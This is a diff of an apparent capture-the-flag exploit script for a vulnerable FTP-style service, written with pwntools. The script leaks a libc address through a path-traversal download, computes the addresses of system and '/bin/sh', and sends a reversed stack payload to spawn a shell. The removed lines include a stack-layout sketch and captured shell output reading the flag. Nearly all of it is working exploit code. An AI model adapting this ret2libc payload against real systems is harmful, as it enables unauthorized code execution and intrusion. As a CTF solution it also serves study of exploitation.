@@ -32,7 +32,7 @@ print r.recvuntil("Choice:")
 join("asdf", "asdf", "asdf", 10)
 login("admin", "P3ssw0rd")
 
-download("aa/../bb/../")
+download("/../AAAA/../")
 
 libc = u32(r.recvuntil("/")[-4:][::-1])
 libc_base = libc - 0x5fa2f
@@ -42,21 +42,7 @@ binsh = libc_base + 0x15902b
 for i in range(0x2e):
 	login("admin", "P3ssw0rd") # login cnt=0x2f now!
 
-'''
-============ <= stack of main
-...
-login_cnt    <= copy payload.reverse() until ret, before canary.
-...
-============ <= stack of menu 8
-...
-ret
-...
-canary
-...
-============ <= stack of downloadURL
-'''
-
-payload = "aa/../../cccccccc" # reverse input
+payload = "/../../AAAAAAAA" # reverse input
 payload += p32(binsh)[::-1]
 payload += "AAAA"
 payload += p32(system)[::-1]
@@ -64,16 +50,3 @@ payload += p32(system)[::-1]
 download(payload)
 
 r.interactive()
-
-'''
-[*] Switching to interactive mode
-
-Download for URL:
-/cccccccc�X0+AAAA�FI@
-$ id
-uid=1000(ftp) gid=1000(ftp) groups=1000(ftp)
-$ 
-$ cat flag
-Sorry_ftp_1s_brok3n_T_T@
-$ 
-'''
